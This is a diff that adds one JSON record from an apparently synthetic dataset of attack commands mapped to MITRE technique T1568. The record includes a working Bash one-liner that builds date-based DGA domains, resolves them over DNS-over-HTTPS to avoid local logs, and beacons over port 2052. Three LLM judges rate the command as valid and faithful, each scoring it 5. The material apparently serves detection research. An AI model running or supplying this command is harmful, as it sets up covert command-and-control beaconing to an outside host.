@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "SEED=\"eta\"; CANDS=(); for i in $(seq 1 3); do CANDS+=(\"$(printf \"%s\" \"${SEED}$(date -u +%Y%m%d)$i\" | sha256sum | cut -c1-12).telemetry-sync.cc\"); done; for FQDN in \"${CANDS[@]}\"; do if curl -sSfI --doh-url https://dns.quad9.net/dns-query --connect-timeout 2 \"https://${FQDN}:2052/ping\"; then curl -sS --doh-url https://dns.quad9.net/dns-query \"https://${FQDN}:2052/beacon?rnd=$RANDOM\"; break; fi; done",
+  "explanation": "Produces several DGA candidates, uses DoH against Quad9 to test reachability, and then communicates over port 2052 to blend with atypical TLS traffic.",
+  "rationale_steps": [
+    "Generate multiple candidate DGA domains",
+    "Resolve via DoH to avoid local DNS logs",
+    "Probe for a live endpoint on port 2052",
+    "Send beacon once an endpoint responds"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-a69367b6-e3093459",
+  "source_prompt_hash": "a69367b6",
+  "timestamp_utc": "2025-09-30T09:31:37.018067Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper variable assignments, correct array usage, appropriate command separators, valid flags for curl, and proper loop constructs.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the T1568 Dynamic Resolution technique by generating domain names algorithmically (DGA-like behavior) based on a seed and date, using DoH to resolve them, testing connectivity, and establishing a command channel on an unusual port (2052) with randomized beacon parameters.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T06:21:09.405405Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct bash syntax for variable assignment, array manipulation, loops, command substitution, and valid `curl` flags with proper quoting.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements Dynamic Resolution (T1568) by generating daily DGA candidates, using DoH for stealthy resolution, attempting to connect on a non-standard TLS port (2052) for blending, and performing a beacon after successful connection, all of which are operationally plausible adversary behaviors.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-02T06:21:16.463835Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Bash arrays, loops, and parameter expansion are correct with balanced quoting and separators, and curl flags (including --doh-url, -sSfI) are valid and properly used.",
+        "semantic_score": 5,
+        "semantic_justification": "It algorithmically generates date-based DGA-style FQDNs, uses DoH to resolve/test reachability, and then beacons over a nonstandard TLS port, aligning well with T1568 Dynamic Resolution.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T06:22:15.402478Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
